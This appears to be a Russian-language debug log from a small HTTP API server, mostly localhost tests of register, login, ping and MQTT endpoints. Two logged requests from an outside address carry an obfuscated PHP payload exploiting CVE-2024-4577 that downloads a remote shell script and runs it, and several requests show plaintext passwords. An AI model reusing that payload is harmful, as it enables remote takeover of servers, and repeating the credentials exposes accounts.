25.08.25 08:14:31 22920066119488: Сервер запущен 0.0.0.0: 20008
25.08.25 10:25:52 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:25:52 22920033187392: URL: /api/v2_1/sc/register
25.08.25 10:25:52 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 10:33:13 22920033187392: Запрос:
	Address: 91.244.74.74
	Query: { "login": "www-bolotina", "pass": "6K4q_gH", "secret": "secret" }
	Authorization: empty
25.08.25 10:33:13 22920033187392: URL: /api/v2_1/sc/register
25.08.25 10:33:13 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 10:47:38 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:47:38 22920033187392: URL: /api/v2_1/sc/register
25.08.25 10:47:38 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 10:51:16 22920033187392: Запрос:
	Address: 119.8.169.21
	Query: <?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
	Authorization: empty
25.08.25 10:51:16 22920033187392: Expecting value: line 1 column 1 (char 0)
25.08.25 10:51:16 22920033187392: Запрос:
	Address: 119.8.169.21
	Query: <?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
	Authorization: empty
25.08.25 10:51:16 22920033187392: Expecting value: line 1 column 1 (char 0)
25.08.25 10:52:58 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:52:58 22920033187392: URL: /api/v2_1/sc/proc_register
25.08.25 10:52:58 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
25.08.25 10:53:23 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:53:23 22920033187392: URL: /api/v2_1/sc/proc_register
25.08.25 10:53:23 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
25.08.25 10:53:59 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:53:59 22920033187392: URL: /api/v2_1/sc/proc_register
25.08.25 10:53:59 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
25.08.25 10:56:22 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:56:22 22920033187392: URL: /api/v2_1/sc/proc_register
25.08.25 10:56:22 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
25.08.25 10:57:23 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:57:23 22920033187392: URL: /api/v2_1/sc/register
25.08.25 10:57:23 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 10:58:49 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:58:49 22920033187392: URL: /api/v2_1/sc/register
25.08.25 10:58:49 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 10:59:46 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "testuser",
  "pass": "1234"
}
	Authorization: empty
25.08.25 10:59:46 22920033187392: URL: /api/v2_1/sc/register
25.08.25 10:59:46 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 11:00:19 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "www-bolotina",
  "pass": "6K4q_9gH"
}
	Authorization: empty
25.08.25 11:00:19 22920033187392: URL: /api/v2_1/sc/register
25.08.25 11:00:19 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
25.08.25 11:09:58 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "www-bolotina",
  "pass": "6K4q_9gH"
}
	Authorization: empty
25.08.25 11:10:37 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "www-bolotina",
  "pass": "6K4q_9gH"
}
	Authorization: empty
25.08.25 11:10:37 22920033187392: URL: /api/v2_1/sc/pingserver
25.08.25 11:10:37 22920033187392: Из запроса /api/v2_1/sc/pingserver не удалось получить название проекта.
25.08.25 11:10:49 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "www-bolotina",
  "pass": "6K4q_9gH"
}
	Authorization: empty
25.08.25 11:11:06 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "www-bolotina",
  "pass": "6K4q_9gH"
}
	Authorization: empty
25.08.25 11:11:10 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: 
	Authorization: empty
25.08.25 11:11:10 22920033187392: Expecting value: line 1 column 1 (char 0)
25.08.25 11:11:17 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: 
	Authorization: empty
25.08.25 11:11:17 22920033187392: Expecting value: line 1 column 1 (char 0)
25.08.25 11:11:23 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {
  "login": "www-bolotina",
  "pass": "6K4q_9gH"
}
	Authorization: empty
25.08.25 11:11:31 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {


}
	Authorization: empty
25.08.25 11:11:38 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: 
	Authorization: empty
25.08.25 11:11:38 22920033187392: Expecting value: line 1 column 1 (char 0)
25.08.25 11:11:48 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: 
	Authorization: empty
25.08.25 11:11:48 22920033187392: Expecting value: line 1 column 1 (char 0)
25.08.25 11:11:52 22920033187392: Запрос:
	Address: 54.86.50.139
	Query: {}
	Authorization: empty
25.08.26 11:09:25 140666770137088: Сервер запущен 0.0.0.0: 20008
25.08.26 11:23:13 140666740454976: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:43:02 140430923079680: Сервер запущен 0.0.0.0: 20008
25.08.26 11:43:18 140430883980864: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:43:18 140430883980864: начало
25.08.26 11:43:23 140430883980864: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:43:23 140430883980864: начало
25.08.26 11:43:23 140430883980864: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:43:23 140430883980864: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 11:46:04 140430883980864: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:46:04 140430883980864: начало
25.08.26 11:46:04 140430883980864: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:46:04 140430883980864: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 11:46:09 139747247022080: Сервер запущен 0.0.0.0: 20008
25.08.26 11:46:16 139747207923264: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:46:16 139747207923264: начало
25.08.26 11:46:18 139747207923264: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:46:18 139747207923264: начало
25.08.26 11:46:18 139747207923264: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:46:18 139747207923264: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 11:48:16 139747207923264: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:48:16 139747207923264: начало
25.08.26 11:48:57 140346695217152: Сервер запущен 0.0.0.0: 20008
25.08.26 11:49:00 140346656118336: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:49:00 140346656118336: начало
25.08.26 11:49:00 140346656118336: [Errno 2] No such file or directory: '/api/v2_1/sc/_error.log'
25.08.26 11:49:15 139841994219520: Сервер запущен 0.0.0.0: 20008
25.08.26 11:49:21 139841955120704: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:49:21 139841955120704: начало
25.08.26 11:49:21 139841955120704: [Errno 2] No such file or directory: '/api/v2_1/sc/_error.log'
25.08.26 11:49:46 139841955120704: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:49:46 139841955120704: начало
25.08.26 11:49:46 139841955120704: [Errno 2] No such file or directory: '/api/v2_1/sc/_error.log'
25.08.26 11:53:19 139841955120704: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:53:19 139841955120704: начало
25.08.26 11:53:19 139841955120704: [Errno 2] No such file or directory: '/api/v2_1/sc/_error.log'
25.08.26 11:54:47 140054108442624: Сервер запущен 0.0.0.0: 20008
25.08.26 11:54:50 140054069343808: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:54:50 140054069343808: начало
25.08.26 11:54:50 140054069343808: url_prefix
25.08.26 11:54:50 140054069343808: /api/v2_1/sc/
25.08.26 11:55:14 139930958721024: Сервер запущен 0.0.0.0: 20008
25.08.26 11:55:19 139930919622208: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:55:19 139930919622208: начало
25.08.26 11:55:19 139930919622208: url_prefix
25.08.26 11:55:19 139930919622208: /api/v2_1/sc/
25.08.26 11:55:19 139930919622208: if
25.08.26 11:55:19 139930919622208: parts
25.08.26 11:55:19 139930919622208: ['ping']
25.08.26 11:55:30 139930919622208: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:55:30 139930919622208: начало
25.08.26 11:55:30 139930919622208: url_prefix
25.08.26 11:55:30 139930919622208: /api/v2_1/sc/
25.08.26 11:55:30 139930919622208: if
25.08.26 11:55:30 139930919622208: parts
25.08.26 11:55:30 139930919622208: ['mqtt_last']
25.08.26 11:55:30 139930919622208: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:55:30 139930919622208: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 11:55:37 139930919622208: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:55:37 139930919622208: начало
25.08.26 11:55:37 139930919622208: url_prefix
25.08.26 11:55:37 139930919622208: /api/v2_1/sc/
25.08.26 11:55:37 139930919622208: if
25.08.26 11:55:37 139930919622208: parts
25.08.26 11:55:37 139930919622208: ['mqtt_last']
25.08.26 11:55:37 139930919622208: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:55:37 139930919622208: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 11:57:33 139950389907456: Сервер запущен 0.0.0.0: 20008
25.08.26 11:57:42 139950350808640: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:57:42 139950350808640: начало
25.08.26 11:57:42 139950350808640: url_prefix
25.08.26 11:57:42 139950350808640: /api/v2_1/sc/
25.08.26 11:57:42 139950350808640: if
25.08.26 11:57:42 139950350808640: parts
25.08.26 11:57:42 139950350808640: ['ping']
25.08.26 11:57:42 139950350808640: project_name
25.08.26 11:57:42 139950350808640: None
25.08.26 11:57:49 139950350808640: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:57:49 139950350808640: начало
25.08.26 11:57:49 139950350808640: url_prefix
25.08.26 11:57:49 139950350808640: /api/v2_1/sc/
25.08.26 11:57:49 139950350808640: if
25.08.26 11:57:49 139950350808640: parts
25.08.26 11:57:49 139950350808640: ['mqtt_last']
25.08.26 11:57:49 139950350808640: project_name
25.08.26 11:57:49 139950350808640: None
25.08.26 11:57:49 139950350808640: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:57:49 139950350808640: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 11:59:36 139751252672512: Сервер запущен 0.0.0.0: 20008
25.08.26 11:59:40 139751213573696: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:59:40 139751213573696: начало
25.08.26 11:59:40 139751213573696: url_path
25.08.26 11:59:40 139751213573696: /api/v2_1/sc/ping
25.08.26 11:59:40 139751213573696: url_prefix
25.08.26 11:59:40 139751213573696: /api/v2_1/sc/
25.08.26 11:59:40 139751213573696: if
25.08.26 11:59:40 139751213573696: parts
25.08.26 11:59:40 139751213573696: ['ping']
25.08.26 11:59:40 139751213573696: project_name
25.08.26 11:59:40 139751213573696: None
25.08.26 11:59:48 139751213573696: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 11:59:48 139751213573696: начало
25.08.26 11:59:48 139751213573696: url_path
25.08.26 11:59:48 139751213573696: /api/v2_1/sc/mqtt_last
25.08.26 11:59:48 139751213573696: url_prefix
25.08.26 11:59:48 139751213573696: /api/v2_1/sc/
25.08.26 11:59:48 139751213573696: if
25.08.26 11:59:48 139751213573696: parts
25.08.26 11:59:48 139751213573696: ['mqtt_last']
25.08.26 11:59:48 139751213573696: project_name
25.08.26 11:59:48 139751213573696: None
25.08.26 11:59:48 139751213573696: URL: /api/v2_1/sc/mqtt_last
25.08.26 11:59:48 139751213573696: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 12:01:13 139751213573696: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 12:01:13 139751213573696: начало
25.08.26 12:01:13 139751213573696: url_path
25.08.26 12:01:13 139751213573696: /api/v2_1/sc/mqtt_last
25.08.26 12:01:13 139751213573696: url_prefix
25.08.26 12:01:13 139751213573696: /api/v2_1/sc/
25.08.26 12:01:13 139751213573696: if
25.08.26 12:01:13 139751213573696: parts
25.08.26 12:01:13 139751213573696: ['mqtt_last']
25.08.26 12:01:13 139751213573696: project_name
25.08.26 12:01:13 139751213573696: None
25.08.26 12:01:13 139751213573696: URL: /api/v2_1/sc/mqtt_last
25.08.26 12:01:13 139751213573696: Из запроса /api/v2_1/sc/mqtt_last не удалось получить название проекта.
25.08.26 12:01:19 140541610762240: Сервер запущен 0.0.0.0: 20008
25.08.26 12:01:27 140541571663424: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 12:01:27 140541571663424: начало
25.08.26 12:01:27 140541571663424: url_path
25.08.26 12:01:27 140541571663424: /api/v2_1/sc/ping
25.08.26 12:01:27 140541571663424: url_prefix
25.08.26 12:01:27 140541571663424: /api/v2_1/sc/
25.08.26 12:01:27 140541571663424: if
25.08.26 12:01:27 140541571663424: parts
25.08.26 12:01:27 140541571663424: ['ping']
25.08.26 12:01:27 140541571663424: project_name
25.08.26 12:01:27 140541571663424: None
25.08.26 12:01:29 140541571663424: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 12:01:29 140541571663424: начало
25.08.26 12:01:29 140541571663424: url_path
25.08.26 12:01:29 140541571663424: /api/v2_1/sc/mqtt_last
25.08.26 12:01:29 140541571663424: url_prefix
25.08.26 12:01:29 140541571663424: /api/v2_1/sc/
25.08.26 12:01:29 140541571663424: if
25.08.26 12:01:29 140541571663424: parts
25.08.26 12:01:29 140541571663424: ['mqtt_last']
25.08.26 12:01:29 140541571663424: project_name
25.08.26 12:01:29 140541571663424: None
25.08.26 12:01:29 140541571663424: mQtT
25.08.26 12:03:00 139732396322816: Сервер запущен 0.0.0.0: 20008
25.08.26 12:08:28 139691638988800: Сервер запущен 0.0.0.0: 20008
25.08.26 12:08:38 139691529598528: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.26 12:08:38 139691529598528: начало
25.08.26 12:08:38 139691529598528: url_path
25.08.26 12:08:38 139691529598528: /api/v2_1/sc/mqtt_last
25.08.26 12:08:38 139691529598528: url_prefix
25.08.26 12:08:38 139691529598528: /api/v2_1/sc/
25.08.26 12:08:38 139691529598528: if
25.08.26 12:08:38 139691529598528: parts
25.08.26 12:08:38 139691529598528: ['mqtt_last']
25.08.26 12:08:38 139691529598528: project_name
25.08.26 12:08:38 139691529598528: None
25.08.26 12:08:38 139691529598528: mQtT
25.08.27 09:47:46 138264865533952: Сервер запущен 0.0.0.0: 20008
25.08.27 09:48:46 138264824116800: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 09:48:46 138264824116800: начало
25.08.27 09:48:46 138264824116800: url_path
25.08.27 09:48:46 138264824116800: /api/v2_1/sc/ping
25.08.27 09:48:46 138264824116800: url_prefix
25.08.27 09:48:46 138264824116800: /api/v2_1/sc/
25.08.27 09:48:46 138264824116800: if
25.08.27 09:48:46 138264824116800: parts
25.08.27 09:48:46 138264824116800: ['ping']
25.08.27 09:48:46 138264824116800: project_name
25.08.27 09:48:46 138264824116800: None
25.08.27 09:49:35 138264824116800: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 09:49:35 138264824116800: начало
25.08.27 09:49:35 138264824116800: url_path
25.08.27 09:49:35 138264824116800: /api/v2_1/sc/mqtt_last
25.08.27 09:49:35 138264824116800: url_prefix
25.08.27 09:49:35 138264824116800: /api/v2_1/sc/
25.08.27 09:49:35 138264824116800: if
25.08.27 09:49:35 138264824116800: parts
25.08.27 09:49:35 138264824116800: ['mqtt_last']
25.08.27 09:49:35 138264824116800: project_name
25.08.27 09:49:35 138264824116800: None
25.08.27 09:49:35 138264824116800: mQtT
25.08.27 09:54:02 138264824116800: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 09:54:02 138264824116800: начало
25.08.27 09:54:02 138264824116800: url_path
25.08.27 09:54:02 138264824116800: /api/v2_1/sc/mqtt_last
25.08.27 09:54:02 138264824116800: url_prefix
25.08.27 09:54:02 138264824116800: /api/v2_1/sc/
25.08.27 09:54:02 138264824116800: if
25.08.27 09:54:02 138264824116800: parts
25.08.27 09:54:02 138264824116800: ['mqtt_last']
25.08.27 09:54:02 138264824116800: project_name
25.08.27 09:54:02 138264824116800: None
25.08.27 09:54:02 138264824116800: mQtT
25.08.27 16:32:36 138388786749440: Сервер запущен 0.0.0.0: 20008
25.08.27 16:58:56 138388745217600: Запрос:
	Address: 127.0.0.1
	Query: 
	Authorization: empty
25.08.27 16:58:56 138388745217600: Expecting value: line 1 column 1 (char 0)
25.08.27 16:59:23 138388745217600: Запрос:
	Address: 127.0.0.1
	Query: 
	Authorization: empty
25.08.27 16:59:23 138388745217600: Expecting value: line 1 column 1 (char 0)
25.08.27 16:59:23 138388745217600: Запрос:
	Address: 127.0.0.1
	Query: {"login":"bolotina","pass":"bolotina112233"}
	Authorization: empty
25.08.27 16:59:23 138388745217600: начало
25.08.27 16:59:23 138388745217600: url_path
25.08.27 16:59:23 138388745217600: /api/v2_1/sc/login
25.08.27 16:59:23 138388745217600: url_prefix
25.08.27 16:59:23 138388745217600: /api/v2_1/sc/
25.08.27 16:59:23 138388745217600: if
25.08.27 16:59:23 138388745217600: parts
25.08.27 16:59:23 138388745217600: ['login']
25.08.27 16:59:23 138388745217600: project_name
25.08.27 16:59:23 138388745217600: None
25.08.27 16:59:23 138388745217600: URL: /api/v2_1/sc/login
25.08.27 16:59:23 138388745217600: Из запроса /api/v2_1/sc/login не удалось получить название проекта.
25.08.27 17:00:12 138409174134784: Сервер запущен 0.0.0.0: 20008
25.08.27 17:00:34 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: 
	Authorization: empty
25.08.27 17:00:34 138409132680768: Expecting value: line 1 column 1 (char 0)
25.08.27 17:00:47 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: 
	Authorization: empty
25.08.27 17:00:47 138409132680768: Expecting value: line 1 column 1 (char 0)
25.08.27 17:02:18 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: 
	Authorization: empty
25.08.27 17:02:18 138409132680768: Expecting value: line 1 column 1 (char 0)
25.08.27 17:03:44 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:03:44 138409132680768: начало
25.08.27 17:03:44 138409132680768: url_path
25.08.27 17:03:44 138409132680768: /api/v2_1/sc/ping
25.08.27 17:03:44 138409132680768: url_prefix
25.08.27 17:03:44 138409132680768: /api/v2_1/sc/
25.08.27 17:03:44 138409132680768: if
25.08.27 17:03:44 138409132680768: parts
25.08.27 17:03:44 138409132680768: ['ping']
25.08.27 17:03:44 138409132680768: project_name
25.08.27 17:03:44 138409132680768: None
25.08.27 17:05:48 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:05:48 138409132680768: начало
25.08.27 17:05:48 138409132680768: url_path
25.08.27 17:05:48 138409132680768: /api/v2_1/sc/ping
25.08.27 17:05:48 138409132680768: url_prefix
25.08.27 17:05:48 138409132680768: /api/v2_1/sc/
25.08.27 17:05:48 138409132680768: if
25.08.27 17:05:48 138409132680768: parts
25.08.27 17:05:48 138409132680768: ['ping']
25.08.27 17:05:48 138409132680768: project_name
25.08.27 17:05:48 138409132680768: None
25.08.27 17:05:48 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:05:48 138409132680768: начало
25.08.27 17:05:48 138409132680768: url_path
25.08.27 17:05:48 138409132680768: /api/v2_1/sc/mqtt_last
25.08.27 17:05:48 138409132680768: url_prefix
25.08.27 17:05:48 138409132680768: /api/v2_1/sc/
25.08.27 17:05:48 138409132680768: if
25.08.27 17:05:48 138409132680768: parts
25.08.27 17:05:48 138409132680768: ['mqtt_last']
25.08.27 17:05:48 138409132680768: project_name
25.08.27 17:05:48 138409132680768: None
25.08.27 17:05:48 138409132680768: mQtT
25.08.27 17:10:43 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:10:43 138409132680768: начало
25.08.27 17:10:43 138409132680768: url_path
25.08.27 17:10:43 138409132680768: /api/v2_1/sc/ping
25.08.27 17:10:43 138409132680768: url_prefix
25.08.27 17:10:43 138409132680768: /api/v2_1/sc/
25.08.27 17:10:43 138409132680768: if
25.08.27 17:10:43 138409132680768: parts
25.08.27 17:10:43 138409132680768: ['ping']
25.08.27 17:10:43 138409132680768: project_name
25.08.27 17:10:43 138409132680768: None
25.08.27 17:10:46 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:10:46 138409132680768: начало
25.08.27 17:10:46 138409132680768: url_path
25.08.27 17:10:46 138409132680768: /api/v2_1/sc/ping
25.08.27 17:10:46 138409132680768: url_prefix
25.08.27 17:10:46 138409132680768: /api/v2_1/sc/
25.08.27 17:10:46 138409132680768: if
25.08.27 17:10:46 138409132680768: parts
25.08.27 17:10:46 138409132680768: ['ping']
25.08.27 17:10:46 138409132680768: project_name
25.08.27 17:10:46 138409132680768: None
25.08.27 17:10:51 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:10:51 138409132680768: начало
25.08.27 17:10:51 138409132680768: url_path
25.08.27 17:10:51 138409132680768: /api/v2_1/sc/ping
25.08.27 17:10:51 138409132680768: url_prefix
25.08.27 17:10:51 138409132680768: /api/v2_1/sc/
25.08.27 17:10:51 138409132680768: if
25.08.27 17:10:51 138409132680768: parts
25.08.27 17:10:51 138409132680768: ['ping']
25.08.27 17:10:51 138409132680768: project_name
25.08.27 17:10:51 138409132680768: None
25.08.27 17:16:00 138409132680768: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:16:00 138409132680768: начало
25.08.27 17:16:00 138409132680768: url_path
25.08.27 17:16:00 138409132680768: /api/v2_1/sc/mqtt_last
25.08.27 17:16:00 138409132680768: url_prefix
25.08.27 17:16:00 138409132680768: /api/v2_1/sc/
25.08.27 17:16:00 138409132680768: if
25.08.27 17:16:00 138409132680768: parts
25.08.27 17:16:00 138409132680768: ['mqtt_last']
25.08.27 17:16:00 138409132680768: project_name
25.08.27 17:16:00 138409132680768: None
25.08.27 17:16:00 138409132680768: mQtT
25.08.27 17:16:09 125904207507456: Сервер запущен 0.0.0.0: 20008
25.08.27 17:16:13 125904166188608: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:16:13 125904166188608: начало
25.08.27 17:16:13 125904166188608: url_path
25.08.27 17:16:13 125904166188608: /api/v2_1/sc/mqtt_last
25.08.27 17:16:13 125904166188608: url_prefix
25.08.27 17:16:13 125904166188608: /api/v2_1/sc/
25.08.27 17:16:13 125904166188608: if
25.08.27 17:16:13 125904166188608: parts
25.08.27 17:16:13 125904166188608: ['mqtt_last']
25.08.27 17:16:13 125904166188608: project_name
25.08.27 17:16:13 125904166188608: None
25.08.27 17:16:13 125904166188608: mQtT
25.08.27 17:17:27 125904166188608: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:17:27 125904166188608: начало
25.08.27 17:17:27 125904166188608: url_path
25.08.27 17:17:27 125904166188608: /api/v2_1/sc/ping
25.08.27 17:17:27 125904166188608: url_prefix
25.08.27 17:17:27 125904166188608: /api/v2_1/sc/
25.08.27 17:17:27 125904166188608: if
25.08.27 17:17:27 125904166188608: parts
25.08.27 17:17:27 125904166188608: ['ping']
25.08.27 17:17:27 125904166188608: project_name
25.08.27 17:17:27 125904166188608: None
25.08.27 17:17:27 125904166188608: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:17:27 125904166188608: начало
25.08.27 17:17:27 125904166188608: url_path
25.08.27 17:17:27 125904166188608: /api/v2_1/sc/web
25.08.27 17:17:27 125904166188608: url_prefix
25.08.27 17:17:27 125904166188608: /api/v2_1/sc/
25.08.27 17:17:27 125904166188608: if
25.08.27 17:17:27 125904166188608: parts
25.08.27 17:17:27 125904166188608: ['web']
25.08.27 17:17:27 125904166188608: project_name
25.08.27 17:17:27 125904166188608: None
25.08.27 17:17:27 125904166188608: mQtT
25.08.27 17:18:34 123791487393792: Сервер запущен 0.0.0.0: 20008
25.08.27 17:18:37 123791445321280: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:18:37 123791445321280: начало
25.08.27 17:18:37 123791445321280: url_path
25.08.27 17:18:37 123791445321280: /api/v2_1/sc/ping
25.08.27 17:18:37 123791445321280: url_prefix
25.08.27 17:18:37 123791445321280: /api/v2_1/sc/
25.08.27 17:18:37 123791445321280: if
25.08.27 17:18:37 123791445321280: parts
25.08.27 17:18:37 123791445321280: ['ping']
25.08.27 17:18:37 123791445321280: project_name
25.08.27 17:18:37 123791445321280: None
25.08.27 17:18:37 123791445321280: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:18:37 123791445321280: начало
25.08.27 17:18:37 123791445321280: url_path
25.08.27 17:18:37 123791445321280: /api/v2_1/sc/web
25.08.27 17:18:37 123791445321280: url_prefix
25.08.27 17:18:37 123791445321280: /api/v2_1/sc/
25.08.27 17:18:37 123791445321280: if
25.08.27 17:18:37 123791445321280: parts
25.08.27 17:18:37 123791445321280: ['web']
25.08.27 17:18:37 123791445321280: project_name
25.08.27 17:18:37 123791445321280: None
25.08.27 17:18:37 123791445321280: web
25.08.27 17:18:48 123791445321280: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:18:48 123791445321280: начало
25.08.27 17:18:48 123791445321280: url_path
25.08.27 17:18:48 123791445321280: /api/v2_1/sc/ping
25.08.27 17:18:48 123791445321280: url_prefix
25.08.27 17:18:48 123791445321280: /api/v2_1/sc/
25.08.27 17:18:48 123791445321280: if
25.08.27 17:18:48 123791445321280: parts
25.08.27 17:18:48 123791445321280: ['ping']
25.08.27 17:18:48 123791445321280: project_name
25.08.27 17:18:48 123791445321280: None
25.08.27 17:18:48 123791445321280: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:18:48 123791445321280: начало
25.08.27 17:18:48 123791445321280: url_path
25.08.27 17:18:48 123791445321280: /api/v2_1/sc/web
25.08.27 17:18:48 123791445321280: url_prefix
25.08.27 17:18:48 123791445321280: /api/v2_1/sc/
25.08.27 17:18:48 123791445321280: if
25.08.27 17:18:48 123791445321280: parts
25.08.27 17:18:48 123791445321280: ['web']
25.08.27 17:18:48 123791445321280: project_name
25.08.27 17:18:48 123791445321280: None
25.08.27 17:18:48 123791445321280: web
25.08.27 17:19:34 132414110560256: Сервер запущен 0.0.0.0: 20008
25.08.27 17:19:36 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:19:36 132414068221504: начало
25.08.27 17:19:36 132414068221504: url_path
25.08.27 17:19:36 132414068221504: /api/v2_1/sc/ping
25.08.27 17:19:36 132414068221504: url_prefix
25.08.27 17:19:36 132414068221504: /api/v2_1/sc/
25.08.27 17:19:36 132414068221504: if
25.08.27 17:19:36 132414068221504: parts
25.08.27 17:19:36 132414068221504: ['ping']
25.08.27 17:19:36 132414068221504: project_name
25.08.27 17:19:36 132414068221504: None
25.08.27 17:19:36 132414068221504: Запрос:
	Address: 127.0.0.1
